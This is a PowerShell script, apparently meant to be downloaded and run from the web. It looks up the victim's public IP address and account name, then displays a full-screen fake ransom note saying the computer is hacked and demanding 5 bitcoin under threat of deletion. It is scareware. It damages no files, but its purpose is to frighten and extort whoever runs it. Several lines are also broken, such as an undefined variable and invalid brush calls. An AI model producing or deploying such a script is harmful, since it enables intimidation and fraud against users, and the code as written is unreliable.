Write-Host "Hello from the web!"
try {
    Add-Type -AssemblyName System.Drawing.Common
} catch {
    Write-Warning "Could not load System.Drawing.Common assembly."
    exit
}

try {
    Add-Type -AssemblyName System.Windows.Forms
} catch {
    Write-Warning "Could not load System.Windows.Forms assembly."
    exit
}
function Get-PublicIP {
    try {
        (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content.Trim()
    }
    catch {
        Write-Warning "Could not retrieve public IP address."
        return ""
    }
}

# Get the public IP address
$PublicIP = Get-PublicIP

# Get the current username
$Username = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")

# Format the text
$TextContent = @"
Your have been hacked
##################################
IP Address: $PublicIP
##################################
User: $Username
##################################
Your comouter is not safe please pay 5 bitcoin to me or i will delete
"@

# Define the output text file path
$TextFilePath = "$env:TEMP\fake_hack.txt"

# Save the text to a file
$TextContent | Out-File -Path $TextFilePath -Encoding UTF8

# Get screen resolution
$ScreenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
$ScreenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height

# Define the output JPG file path
$ImagePath = "$env:TEMP\fake_hack.jpg"

# Install-Module -Name System.Drawing.Common -Force # Uncomment and run once if you don't have this module

# Create a drawing surface
Add-Type -AssemblyName System.Drawing.Common
$Bitmap = New-Object System.Drawing.Bitmap($ScreenWidth, $ScreenHeight)
$Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)

# Set background color (optional)
$BackgroundColor = [System.Drawing.SolidBrush]::White
$Graphics.FillRectangle($BackgroundColor, 0, 0, $ScreenWidth, $ScreenHeight)

# Define font and brush for text
$Font = New-Object System.Drawing.Font("Arial", 24)
$Brush = New-Object System.Drawing.SolidBrush("Black")

# Define starting Y-coordinate for text
$Y = 50

# Loop through each line of the text and draw it
foreach ($Line in $TextContent.Split("`n")) {
    $Graphics.DrawString($Line, $Font, $Brush, 50, $Y)
    $Y += $Font.GetHeight($Graphics) + 10 # Adjust spacing
}

# Save the bitmap as a JPG
$Bitmap.Save($ImagePath, [System.Drawing.Imaging.ImageFormat]::Jpeg)

# Clean up resources
$Font.Dispose()
$Brush.Dispose()
$Graphics.Dispose()
$Bitmap.Dispose()

# Display the image
Start-Process $ImagePath
Read-Host -Prompt "Press Enter to continue..."
